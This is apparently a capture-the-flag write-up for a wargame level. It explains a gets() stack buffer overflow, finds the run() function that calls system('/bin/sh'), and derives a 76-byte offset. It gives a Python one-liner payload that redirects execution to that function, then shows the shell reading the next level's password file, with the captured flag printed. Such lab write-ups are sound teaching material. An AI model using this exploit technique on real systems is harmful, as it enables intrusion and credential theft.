The executable found in level1 once runned waits for some input, once we pass it
any random input less than 76 bytes long the program just returns.
Disassebling the code we set a brak point in main() and we can see that the ESP is set by
sub 	ESP, 0X50 ; this make a total of 80 bytes, next we see LEA (load effective address)
to `EAX[ESP+0X10]` if we add this to stack  pointer we get 80-16 what gives us 64, so we  know
this is the address for the gets() function that comes after setting this address.
Unfortunately we can not use nm here to check for more details, but we still can use
objdump -d(display assembler mnemonics for the machine instructions) level1 and it will
give us two interesting function from this executable <system@plt> and <run>.
Now lets disassembly the run() function and see what we  get, we can try to examine some
addresses found in the run() function
$ x/s 0x8048570
0x8048570:	 "Good... Wait what?\n"
What is that? not really interesting stuff, then we see a call to <fwrite@plt> and just after
that we have another address being set to ESP, let's check
$ x/s 0x8048584
0x8048584:	 "/bin/sh"
Oh this is very interesting, and just after that we have a call to <system@plt>
We know now we need a way to execute this fucntion, we have some crucial information here, we
know that there is an address with a len of 64 bytes that will  store the input from gets, 
we know gets() is not secure, that we can pass anything to it and we know the address of the 
run() function <0x08048444>
We need to overflow the stack filling it with any sort character we want, and just before the
return address in main we should fill it with the address of the run() function.
(Bear in mind that 0x86 has little-endian architecture, remember 'little end first' so the address 0x08048444 becomes 0x44840408 ) 
We can go to [buffer-overflow-generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) to find the offset
past the code generated from this website once running level1 then copy the address return with the segfault
return to the website and get the of 76

write the payload: (for permission reason create it in /tmp)
python -c "print 'A' * 76 + '\x44\x84\x04\x08'" > /tmp/buffer
(if you don't give '-' option to cat the segfault will quit and we can not get controll of the shel
giving this option will keeps the standard entry open so we can execute the command in the new opened shell to get the flag)
~$ cat /tmp/buffer - | ./level1 
Good... Wait what?

cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
Segmentation fault (core dumped)

we can also use: <br>
`(python -c "print 'A' * 76 + '\x44\x84\x04\x08'"; cat)  | ./level1`
